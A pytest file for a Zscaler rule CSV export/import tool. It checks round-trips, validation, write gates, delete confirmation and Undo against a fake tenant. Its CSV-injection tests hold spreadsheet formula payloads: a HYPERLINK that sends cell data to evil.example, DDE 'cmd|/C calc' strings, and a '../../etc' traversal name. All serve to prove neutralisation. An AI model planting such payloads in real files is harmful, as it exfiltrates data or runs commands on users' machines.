"""Rules from a spreadsheet: the CSV round-trip for ZIA Cloud Firewall, ZIA
URL filtering and ZPA access policy rules (rule_csv.py, ops_rule_csv.py on
the Bulk changes engine, /api/rule-csv/*).

No real tenant: every test runs the real SDK services over the made-up
sample tenant (fake_rule_tenant.FakeStore, offline_tenant underneath), with
ZIA's and ZPA's rule-order semantics."""
from __future__ import annotations

import csv
import io

import pytest
from fastapi.testclient import TestClient

import admin_ops as ao
import dlp_api_server as srv
import rule_csv as rc
import security

ao.load_plugins()
import ops_rule_csv as orc  # noqa: E402  (registers after admin_ops)
from fake_rule_tenant import client as fake_client  # noqa: E402

SCOPE = ao.scope_for(["dlp", "zia_extras", "zpa"], {})
FW = "firewall"


def _plan(c, spec):
    return ao.plan(c, spec, scope=SCOPE, tenant_label="Fake")


def _apply(c, spec, prep, phrase=None):
    return ao.execute(c, spec, plan_hash=prep["plan_hash"], scope=SCOPE, writes_enabled=True,
                      confirm_text=prep["confirm_phrase"] if phrase is None else phrase, assessor="Alex Assessor", settle_seconds=0)


def _spec(policy, text, **kw):
    return dict({"type": orc.type_for(policy), "policy": policy, "csv": text}, **kw)


def _rows(text):
    return list(csv.reader(io.StringIO(text)))


def _with_rows(text, *rows):
    head = text.split("\r\n", 1)[0]
    return "\r\n".join([head] + list(rows)) + "\r\n"


@pytest.fixture(autouse=True)
def _isolated(monkeypatch, tmp_path):
    monkeypatch.setenv("DLP_CHECK_AUDIT", str(tmp_path / "audit.log"))
    monkeypatch.setenv("DLP_CHECK_DEPLOYMENTS", str(tmp_path / "deployments.json"))
    monkeypatch.setattr(security, "_write_override", None)


# ── export and round-trip identity ──────────────────────────────────────
@pytest.mark.parametrize("policy", ["firewall", "url_filtering", "zpa_access"])
def test_export_then_import_unchanged_plans_nothing_and_writes_nothing(policy):
    """ASVS V5.1.3 · CWE-20 · WSTG-BUSL-01: a file exported and imported unchanged is identical to the tenant: no change is planned."""
    st, c = fake_client()
    ex = orc.export_csv(c, policy)
    assert ex["rules"] >= 3 and ex["errors"] == {}
    head = _rows(ex["csv"])[0]
    assert head == rc.column_names(policy)
    prep = _plan(c, _spec(policy, ex["csv"], remove_missing=True))
    assert prep["status"] == "nothing_to_do", [(u["object"]["name"], u["status"], u["before"], u["after"]) for u in prep["items"] if u["status"] != "noop"]
    assert prep["counts"]["change"] == 0
    assert st.writes_seen == [], "planning never writes"


def test_export_uses_names_not_ids_with_order_and_rank():
    """ASVS V5.1.3 · CWE-20 · WSTG-BUSL-01: the export names objects (a network service, a custom URL category), with the order and the admin rank."""
    _st, c = fake_client()
    fw = _rows(orc.export_csv(c, FW)["csv"])
    head, quic = fw[0], fw[1]
    assert quic[head.index("name")] == "Block QUIC to force inspection" and quic[head.index("nw_services")] == "QUIC"
    assert quic[head.index("order")] == "1" and quic[head.index("rank")] == "7"
    uf = _rows(orc.export_csv(c, "url_filtering")["csv"])
    cats = [r[uf[0].index("url_categories")] for r in uf[1:]]
    assert "Larkspur partner portals" in cats and not any("CUSTOM_" in x for x in cats)
    zp = _rows(orc.export_csv(c, "zpa_access")["csv"])
    assert zp[1][zp[0].index("segment_groups")] == "Finance apps"
    assert "POSTURE" in zp[1][zp[0].index("other_conditions")]


# ── CSV injection ───────────────────────────────────────────────────────
@pytest.mark.parametrize("value", ['=HYPERLINK("http://evil.example/?d="&A1,"x")', "+cmd|' /C calc'!A0", "-2+3+cmd", "@SUM(1+1)*cmd",
                                   "\tTAB", "'=already quoted", "''double", "plain text"])
def test_export_neutralises_formulas_and_reads_back_exactly(value):
    """ASVS V5.3.10 · CWE-1236 · WSTG-INPV-11: a cell that starts with = + - @ TAB is written with a leading quote, and reading the file gives the value back unchanged."""
    text = rc.to_csv(FW, [{"name": "r1", "description": value, "action": "ALLOW"}])
    cell = _rows(text)[1][rc.column_names(FW).index("description")]
    if value[:1] in "=+-@\t":
        assert cell == "'" + value
    if value.startswith("'="):
        assert cell == "''=already quoted"
    parsed = rc.parse(text, FW)
    assert parsed["rows"][0]["values"]["description"] == value


def test_a_rule_name_that_is_a_formula_is_exported_safe_and_still_matches(monkeypatch):
    """ASVS V5.3.10 · CWE-1236 · WSTG-INPV-11: a tenant rule named like a formula is exported neutralised and the re-import still matches it (no add, no delete)."""
    evil = "=cmd|'/C calc'!A0"

    def mut(resp):
        resp["/zia/api/v1/firewallFilteringRules"][1]["name"] = evil
    st, c = fake_client(mut)
    text = orc.export_csv(c, FW)["csv"]
    assert "'" + evil in text and "\n" + evil not in text
    prep = _plan(c, _spec(FW, text, remove_missing=True))
    assert prep["status"] == "nothing_to_do"


# ── validation of the untrusted file ────────────────────────────────────
@pytest.mark.parametrize("text,needle", [
    ("name,order,colour\r\nx,1,red\r\n", "unknown column"),
    ("order,action\r\n1,ALLOW\r\n", "'name' column is required"),
    ("name,action\r\nx,EXPLODE\r\n", "is not one of"),
    ("name,src_ips\r\nx,10.0.0.0/33\r\n", "not an IP address"),
    ("name,dest_countries\r\nx,USA\r\n", "country code"),
    ("name,order\r\nx,0\r\n", "1 to 10000"),
    ("name,rank\r\nx,9\r\n", "0 to 7"),
    ("name,order\r\nx,1\r\ny,1\r\n", "each position once"),
    ("name\r\nSame\r\nsame\r\n", "each rule once"),
    ("name,enable_full_logging\r\nx,maybe\r\n", "true or false"),
    ("name,action\r\nx,ALLOW,extra\r\n", "cells"),
    ("name,nw_services\r\nx,\x01bad\r\n", "control character"),
    ("name\r\n", "no rules"),
])
def test_invalid_files_are_refused_with_the_line_and_column(text, needle):
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: a file with an unknown column, a bad value, a duplicate or the wrong shape is refused, naming the line and column."""
    with pytest.raises(rc.CsvError) as e:
        rc.parse(text, FW)
    said = str(e.value) + " " + " ".join(p["message"] for p in e.value.problems)
    assert needle in said


def test_size_caps_bytes_rows_cells_and_encoding():
    """ASVS V12.1.1 · CWE-400 · WSTG-BUSL-08: an oversized file, too many rows, an over-long cell, a NUL byte or non-UTF-8 bytes are refused unread."""
    with pytest.raises(rc.CsvError, match="larger than"):
        rc.parse("name\r\n" + "x" * (rc.MAX_BYTES + 1), FW)
    with pytest.raises(rc.CsvError, match="more than"):
        rc.parse("name\r\n" + "".join(f"r{i}\r\n" for i in range(rc.MAX_ROWS + 1)), FW)
    with pytest.raises(rc.CsvError) as e:
        rc.parse("name,description\r\nx," + "d" * (rc.MAX_CELL + 1) + "\r\n", FW)
    assert "longer than" in e.value.problems[0]["message"]
    with pytest.raises(rc.CsvError, match="NUL"):
        rc.parse("name\r\nx\x00\r\n", FW)
    with pytest.raises(rc.CsvError, match="UTF-8"):
        rc.parse(b"name\r\n\xff\xfe\r\n", FW)
    with pytest.raises(rc.CsvError, match="Unknown policy"):
        rc.parse("name\r\nx\r\n", "../../etc")


def test_a_name_that_resolves_to_nothing_excludes_only_that_row():
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: references resolve by name; a row naming an unknown location is excluded with the reason and the rest still plans."""
    st, c = fake_client()
    text = ("name,locations,description\r\n"
            "Block QUIC to force inspection,Nowhere HQ,x\r\n"
            "Allow office traffic,,changed\r\n")
    prep = _plan(c, _spec(FW, text))
    by = {u["object"]["name"]: u for u in prep["items"]}
    assert by["Block QUIC to force inspection"]["status"] == "excluded"
    assert "no location named 'Nowhere HQ'" in by["Block QUIC to force inspection"]["reason"]
    assert by["Allow office traffic"]["status"] == "change" and by["Allow office traffic"]["after"] == {"description": "changed"}
    assert st.writes_seen == []


# ── never applied on selection; the four gates ─────────────────────────
def test_choosing_a_file_only_validates_it_and_reads_no_tenant(monkeypatch):
    """ASVS V1.4.1 · CWE-841 · WSTG-BUSL-06: validating a chosen file signs in to nothing, reads nothing and writes nothing."""
    built = []
    monkeypatch.setattr(srv, "_build_sdk_client", lambda creds: built.append(creds))
    c = TestClient(srv.app)
    ok = c.post("/api/rule-csv/validate", json={"policy": FW, "csv": "name,action\r\nNew one,ALLOW\r\n"})
    assert ok.status_code == 200 and ok.json()["ok"] is True and ok.json()["rows"] == 1
    bad = c.post("/api/rule-csv/validate", json={"policy": FW, "csv": "name,colour\r\nx,red\r\n"})
    assert bad.status_code == 200 and bad.json()["ok"] is False and bad.json()["problems"][0]["column"] == "colour"
    assert built == []
    fmt = c.get("/api/rule-csv/format").json()
    assert set(fmt["policies"]) == {"firewall", "url_filtering", "zpa_access"} and fmt["separator"] == ";"


def test_export_needs_the_policy_in_scope_before_sign_in(monkeypatch):
    """ASVS V4.1.3 · CWE-285 · WSTG-ATHZ-02: exporting a policy that is not ticked on the Scope page is a 400 before any sign-in."""
    built = []
    monkeypatch.setattr(srv, "_build_sdk_client", lambda creds: built.append(creds))
    c = TestClient(srv.app)
    r = c.post("/api/rule-csv/export", json={"policy": "zpa_access", "scopes": ["dlp"], "from_page": True, "vanity_domain": "acme",
                                             "client_id": "cid-1234567", "client_secret": "s", "cloud": "production"})
    assert r.status_code == 400 and "ZPA" in r.json()["detail"]
    assert built == []


def test_export_route_downloads_a_safe_csv(monkeypatch):
    """ASVS V5.3.10 · CWE-1236 · WSTG-INPV-11: the export route returns the policy as a CSV attachment through the same safe writer."""
    _st, fake = fake_client()
    monkeypatch.setattr(srv, "_build_sdk_client", lambda creds: fake)
    c = TestClient(srv.app)
    r = c.post("/api/rule-csv/export", json={"policy": FW, "scopes": ["zia_extras"], "from_page": True, "vanity_domain": "acme",
                                             "client_id": "cid-1234567", "client_secret": "s", "cloud": "production"})
    assert r.status_code == 200, r.text
    assert r.headers["content-type"].startswith("text/csv") and "attachment" in r.headers["content-disposition"]
    assert r.text.splitlines()[0].startswith("name,order,rank,state,action")


def test_apply_needs_write_mode_and_the_assessor():
    """ASVS V4.1.1 · CWE-862 · WSTG-ATHZ-02: the engine refuses to apply a CSV plan without write mode or a named assessor, before anything is read."""
    st, c = fake_client()
    text = _with_rows(orc.export_csv(c, FW)["csv"], "Allow office traffic,2,7,ENABLED,ALLOW,new,,,,,,,,,,,,,,,false")
    prep = _plan(c, _spec(FW, text))
    with pytest.raises(PermissionError):
        ao.execute(c, _spec(FW, text), plan_hash=prep["plan_hash"], scope=SCOPE, writes_enabled=False, assessor="A")
    with pytest.raises(ao.OperationError):
        ao.execute(c, _spec(FW, text), plan_hash=prep["plan_hash"], scope=SCOPE, writes_enabled=True, assessor="")
    assert st.writes_seen == []


def test_a_plan_whose_tenant_changed_is_refused_and_writes_nothing():
    """ASVS V11.1.3 · CWE-367 · WSTG-BUSL-04: the apply plans again; a tenant that changed since the preview gives plan_changed and nothing is written."""
    st, c = fake_client()
    text = _with_rows(orc.export_csv(c, FW)["csv"], "Allow office traffic,2,7,ENABLED,ALLOW,new,,,,,,,,,,,,,,,false")
    spec = _spec(FW, text)
    prep = _plan(c, spec)
    st.responses["/zia/api/v1/firewallFilteringRules"]["body"][1]["description"] = "someone else"
    res = _apply(c, spec, prep)
    assert res["status"] == "plan_changed" and st.writes_seen == []


# ── adds, updates, moves, deletes; read-back; Undo ─────────────────────
def test_new_zia_rules_are_created_disabled_unless_asked():
    """ASVS V1.4.1 · CWE-1188 · WSTG-CONF-02: a new rule from the file is created DISABLED; only the 'create new rules enabled' tick keeps its ENABLED state."""
    st, c = fake_client()
    base = orc.export_csv(c, FW)["csv"]
    text = base.rstrip("\r\n") + "\r\nNew block,,7,ENABLED,BLOCK_DROP,,10.1.0.0/16,,,,,QUIC,,,,,,,,,false\r\n"
    prep = _plan(c, _spec(FW, text))
    add = next(u for u in prep["items"] if u["kind"] == "rule_add")
    assert add["after"]["state"] == "DISABLED" and "DISABLED" in add["reason"]
    res = _apply(c, _spec(FW, text), prep)
    assert res["status"] == "applied" and res["verification"]["mismatched"] == []
    made = next(r for r in st.responses["/zia/api/v1/firewallFilteringRules"]["body"] if r["name"] == "New block")
    assert made["state"] == "DISABLED" and made["nwServices"] == [{"id": 41}]
    st2, c2 = fake_client()
    prep2 = _plan(c2, _spec(FW, text, new_rules_enabled=True))
    assert next(u for u in prep2["items"] if u["kind"] == "rule_add")["after"]["state"] == "ENABLED"


def test_update_move_add_apply_read_back_and_undo_restores_everything():
    """ASVS V7.2.2 · CWE-778 · WSTG-BUSL-01: an update, an add and a move are applied, read back, recorded with an Undo that puts back the fields, the order and removes the new rule."""
    st, c = fake_client()
    before = orc.export_csv(c, FW)["csv"]
    lines = before.strip().split("\r\n")
    text = _with_rows(before,
                      "Allow office traffic,1,7,ENABLED,ALLOW,office,,,,,,,,,,,,,,,false",
                      "New block rule,2,7,ENABLED,BLOCK_DROP,=cmd,10.0.0.0/8,,,,,QUIC,,,,,,,,,true",
                      lines[1].replace(",1,7,", ",3,7,").replace(",,,,,,,QUIC", ",changed,,,,,,QUIC"),
                      lines[3])
    spec = _spec(FW, text)
    prep = _plan(c, spec)
    kinds = sorted(u["kind"] for u in prep["items"] if u["status"] == "change")
    assert kinds == ["rule_add", "rule_move", "rule_update", "rule_update"], kinds
    res = _apply(c, spec, prep)
    assert res["status"] == "applied" and res["verification"]["confirmed"] == res["verification"]["checked"] == 4
    assert res["activation"] and res["activation"]["activated"]
    names = [r["name"] for r in sorted(st.responses["/zia/api/v1/firewallFilteringRules"]["body"], key=lambda r: r["order"])]
    assert names[:3] == ["Allow office traffic", "New block rule", "Block QUIC to force inspection"]
    rec = ao.record(res, by="Alex Assessor", actor="alice@example.com")
    assert rec and rec["inverse"]["action"] == "undo"
    inv = res["inverse"]
    assert ao.is_undo_only(inv)
    p2 = _plan(c, inv)
    r2 = _apply(c, inv, p2)
    assert r2["status"] == "applied", [(u["object"]["name"], u["status"], u.get("reason"), u.get("error")) for u in r2["items"]]
    assert orc.export_csv(c, FW)["csv"] == before


def test_deletes_only_with_the_tick_and_the_stronger_typed_confirmation():
    """ASVS V1.4.1 · CWE-1188 · WSTG-BUSL-06: rules missing from the file are deleted only with 'remove rules not in the file', and applying needs DELETE <n> RULES typed; Undo re-creates them."""
    st, c = fake_client()
    before = orc.export_csv(c, FW)["csv"]
    lines = before.strip().split("\r\n")
    text = _with_rows(before, lines[2])          # only "Allow office traffic"
    keep = _plan(c, _spec(FW, text))
    assert not [u for u in keep["items"] if u["kind"] == "rule_delete"] and keep["status"] == "nothing_to_do"
    spec = _spec(FW, text, remove_missing=True)
    prep = _plan(c, spec)
    dels = [u for u in prep["items"] if u["kind"] == "rule_delete"]
    assert [u["object"]["name"] for u in dels] == ["Block QUIC to force inspection"]   # never the Default rule
    assert prep["confirm_phrase"] == "DELETE 1 RULES"
    for wrong in ("", "I UNDERSTAND", "APPLY 1 CHANGES", "DELETE 2 RULES"):
        r = _apply(c, spec, prep, phrase=wrong)
        assert r["status"] == "refused" and "DELETE 1 RULES" in r["message"]
    assert st.writes_seen == []
    res = _apply(c, spec, prep, phrase="delete 1 rules")
    assert res["status"] == "applied" and [m for m, *_ in st.writes_seen if m == "DELETE"] == ["DELETE"]
    assert "Block QUIC to force inspection" not in orc.export_csv(c, FW)["csv"]
    inv = res["inverse"]
    p2 = _plan(c, inv)
    r2 = _apply(c, inv, p2)
    assert r2["status"] == "applied"
    assert orc.export_csv(c, FW)["csv"] == before


def test_a_sync_filter_limits_deletes_to_the_selection():
    """ASVS V4.1.3 · CWE-285 · WSTG-BUSL-06: with a name-prefix filter, only rules within the selection that the file lacks are deleted."""
    def mut(resp):
        rules = resp["/zia/api/v1/firewallFilteringRules"]
        rules.insert(2, {"id": 805, "order": 3, "rank": 7, "name": "SYNC-old", "state": "ENABLED", "action": "ALLOW"})
    _st, c = fake_client(mut)
    head = orc.export_csv(c, FW)["csv"].split("\r\n", 1)[0]
    text = head + "\r\nSYNC-new,,7,ENABLED,ALLOW,,,,,,,,,,,,,,,,false\r\n"
    prep = _plan(c, _spec(FW, text, remove_missing=True, filter={"prefix": "SYNC-"}))
    assert [u["object"]["name"] for u in prep["items"] if u["kind"] == "rule_delete"] == ["SYNC-old"]


def test_locked_rules_are_never_changed_from_a_file():
    """ASVS V4.1.3 · CWE-284 · WSTG-ATHZ-03: the Default rule (and predefined or read-only rules) is excluded from updates and never deleted."""
    _st, c = fake_client()
    text = "name,action\r\nDefault Firewall Filtering Rule,BLOCK_DROP\r\n"
    prep = _plan(c, _spec(FW, text, remove_missing=True))
    u = next(x for x in prep["items"] if x["object"]["name"] == "Default Firewall Filtering Rule")
    assert u["status"] == "excluded" and "Default rule" in u["reason"]
    assert all(x["object"]["name"] != "Default Firewall Filtering Rule" for x in prep["items"] if x["kind"] == "rule_delete")


def test_a_rule_changed_between_preview_and_write_is_skipped_as_a_conflict(monkeypatch):
    """ASVS V11.1.3 · CWE-367 · WSTG-BUSL-04: each write re-reads its rule; one changed after the plan was checked is left as it is (conflict)."""
    st, c = fake_client()
    text = _with_rows(orc.export_csv(c, FW)["csv"], "Allow office traffic,,7,ENABLED,ALLOW,new,,,,,,,,,,,,,,,false")
    spec = _spec(FW, text)
    prep = _plan(c, spec)
    real = orc.get_rule

    def racing(run, policy, rid):
        st.responses["/zia/api/v1/firewallFilteringRules"]["body"][1]["description"] = "raced"
        return real(run, policy, rid)
    monkeypatch.setattr(orc, "get_rule", racing)
    res = _apply(c, spec, prep)
    assert res["items"][[u["object"]["name"] for u in res["items"]].index("Allow office traffic")]["status"] == "conflict"
    assert not [w for w in st.writes_seen if w[0] in ("PUT", "POST", "DELETE") and "firewallFilteringRules" in w[1]]


# ── ZPA access policy ──────────────────────────────────────────────────
def _zpa_lines(c):
    text = orc.export_csv(c, "zpa_access")["csv"]
    return text, text.strip().split("\r\n")


def test_zpa_new_rules_need_the_tick_because_they_cannot_be_created_disabled():
    """ASVS V1.4.1 · CWE-1188 · WSTG-CONF-02: a new ZPA access rule takes effect at once, so a new row is excluded unless 'create new rules enabled' is ticked."""
    st, c = fake_client()
    text, _ = _zpa_lines(c)
    text = text.rstrip("\r\n") + "\r\nNew zpa rule,,ALLOW,,,Freight billing,,zpn_client_type_zapp,,\r\n"
    prep = _plan(c, _spec("zpa_access", text))
    add = next(u for u in prep["items"] if u["kind"] == "rule_add")
    assert add["status"] == "excluded" and "cannot be created disabled" in add["reason"]
    prep2 = _plan(c, _spec("zpa_access", text, new_rules_enabled=True))
    assert next(u for u in prep2["items"] if u["kind"] == "rule_add")["status"] == "change"
    assert st.writes_seen == []


def test_zpa_update_keeps_conditions_the_file_cannot_express_and_undo_restores():
    """ASVS V5.1.3 · CWE-20 · WSTG-BUSL-01: a ZPA rule's posture and SAML conditions survive an update of its segment groups; the order is one bulk reorder; Undo restores it all."""
    st, c = fake_client()
    before, lines = _zpa_lines(c)
    text = _with_rows(before,
                      lines[2].replace(",2,", ",1,"),
                      lines[1].replace(",1,", ",2,").replace(",Finance apps,", ",Finance apps; All internal (broad),"),
                      lines[3])
    spec = _spec("zpa_access", text)
    prep = _plan(c, spec)
    assert sorted(u["kind"] for u in prep["items"] if u["status"] == "change") == ["rule_move", "rule_update"]
    res = _apply(c, spec, prep)
    assert res["status"] == "applied" and res["verification"]["mismatched"] == [] and res["activation"] is None
    puts = [b for m, p, b in st.writes_seen if m == "PUT" and p.endswith("/rule/2901")]
    types = sorted(o["objectType"] for blk in puts[0]["conditions"] for o in blk["operands"])
    assert types == ["APP_GROUP", "APP_GROUP", "POSTURE", "SAML"]
    assert [b for m, p, b in st.writes_seen if p.endswith("/reorder")] == [["2902", "2901", "2903"]]
    inv = res["inverse"]
    r2 = _apply(c, inv, _plan(c, inv))
    assert r2["status"] == "applied"
    after, _ = _zpa_lines(c)
    assert [r[:9] for r in _rows(after)] == [r[:9] for r in _rows(before)]


def test_zpa_a_family_used_in_an_inexpressible_block_is_locked():
    """ASVS V5.1.3 · CWE-20 · WSTG-BUSL-01: when a family also sits in a negated block, changing that column is excluded instead of rewriting the condition."""
    def mut(resp):
        r = resp["/zpa/mgmtconfig/v1/admin/customers/{customerId}/policySet/rules/policyType/ACCESS_POLICY"]["list"][1]
        r["conditions"].append({"id": "c9", "operator": "OR", "negated": True, "operands": [{"objectType": "APP", "lhs": "id", "rhs": "2202", "name": "Everything internal"}]})
    _st, c = fake_client(mut)
    before, lines = _zpa_lines(c)
    row = _rows(before)[2]
    assert row[0] == "Everyone to everything internal" and row[6] == "" and "NOT" in row[9]   # the family is shown under other conditions
    text = _with_rows(before, "Everyone to everything internal,2,ALLOW,,,,Finance apps,,,")
    prep = _plan(c, _spec("zpa_access", text))
    u = next(x for x in prep["items"] if x["object"]["name"] == "Everyone to everything internal")
    assert u["status"] == "excluded" and "cannot express" in u["reason"]


def test_operations_preview_route_plans_a_csv_and_needs_scope(monkeypatch):
    """ASVS V4.1.3 · CWE-285 · WSTG-ATHZ-02: the Bulk changes preview route plans a CSV import read-only, and refuses a policy not in scope before sign-in."""
    st, fake = fake_client()
    built = []
    monkeypatch.setattr(srv, "_build_sdk_client", lambda creds: built.append(1) or fake)
    c = TestClient(srv.app)
    creds = {"vanity_domain": "acme", "client_id": "cid-1234567", "client_secret": "s", "cloud": "production"}
    text = _with_rows(orc.export_csv(fake, FW)["csv"], "Allow office traffic,,7,ENABLED,ALLOW,new,,,,,,,,,,,,,,,false")
    r = c.post("/api/operations/preview", json={**creds, "scopes": ["dlp"], "from_page": True, "operation": _spec(FW, text)})
    assert r.status_code == 400 and built == []
    r = c.post("/api/operations/preview", json={**creds, "scopes": ["zia_extras"], "from_page": True, "operation": _spec(FW, text)})
    assert r.status_code == 200, r.text
    assert r.json()["counts"]["change"] == 1 and st.writes_seen == []
